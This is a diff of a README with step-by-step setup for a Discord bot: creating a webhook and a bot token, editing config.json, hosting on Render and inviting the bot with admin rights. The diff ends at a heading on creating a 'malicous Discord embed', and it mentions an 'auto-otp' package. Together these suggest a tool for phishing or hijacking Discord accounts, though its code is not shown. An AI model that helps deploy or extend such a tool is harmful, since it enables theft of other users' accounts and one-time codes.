@@ -11,11 +11,22 @@ https://discord.gg/mFxdTZtbqT <<< Support
 
 3. Create a webhook on Discord by following these steps: Create a server, navigate to settings > Integrations, click on Create Webhook, and copy the generated webhook URL.
 
-4. Replace the existing webhook inside the config.json file with the one you just created.
+4. Go to https://discord.com/developers/applications and create a discord bot, copy the token and client id (remember to enable the 3 checkboxes under Privileged Gateway Intents).
 
-5. 8. Keep most settings as default, but make the following adjustments:
+5. Choose a domain-name you will put for your webapp later, this is IMPORTANT. Choose anything random (like https://myfunnybotstuff0.onrender.com), no one else will see this domain
+
+8. Replace the existing content inside the config.json file with the stuff you just created.
+
+9. Upload the modified files to a GitHub repository.
+
+10. Head to dashboard.render.com, create a web service, and link it to your GitHub repository.
+  
+11. Keep most settings as default, but make the following adjustments:
   Build Command: npm i
   Start Command: node bot
+> Building the application on Onrender will take a while due to the package respobsible for auto-otp.
+
+12. Once the web app is live, go to https://discord.com/developers/applications/1186830876315758644/bot > OAuth2 and create a invite link. Enable commands and bot > admin access. (You may now invite the bot and use it however you desire, but remember that its your own responsibily)
 
 # How to create a malicous Discord embed for the bot
 
